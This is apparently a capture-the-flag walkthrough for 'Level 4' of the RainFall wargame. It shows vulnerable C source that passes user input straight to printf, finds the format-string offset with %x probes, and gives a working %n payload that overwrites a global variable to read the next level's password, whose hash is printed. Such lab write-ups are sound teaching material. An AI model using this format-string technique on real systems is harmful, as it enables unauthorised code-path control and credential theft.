# Level 4

<h3>source.c</h3>

```console
int m = 0;

void p(char* str) {
  printf(str);
}

void n(void) {
  char str[520];

  fgets(str, 512, stdin);
  p(str);
  if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
  }
}

void main(void) {
  n();
}
```

<h3>Analysis</h3>

This program looks very similar to `level3` so we could use the same method `Format string` exploit

Target is to modify the `m` global variable to `16930116`

<h3>Exploit</h3>

The address of `m` is at `0x08049810`

Next we need to find which arg position of the `printf()` that we need to store the char counter on

```console
level4@RainFall:~$ (python -c "print 'aaaa' + ' [%x] ' * 15") | ./level4
aaaa [b7ff26b0]  [bffff744]  [b7fd0ff4]  [0]  [0]  [bffff708]  [804848d]  [bffff500]  [200]  [b7fd1ac0]  [b7ff37d0]  [61616161]  [78255b20]  [5b20205d]  [205d7825]
```

There we have it, the 12th position!

Now we need to write `16930112` char since we already have the 4 bytes for the address of `m`, but it is too long and `printf()` will have a hard time printing it

We could use `%16930112d`, where `%d` is the modifier for digits and we can specify the field width by putting some numbers before it

```console
level4@RainFall:~$ (python -c "print '\x10\x98\x04\x08' + '%16930112d' + '%12\$n'") | ./level4
[...]
[...One eternity later...]
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```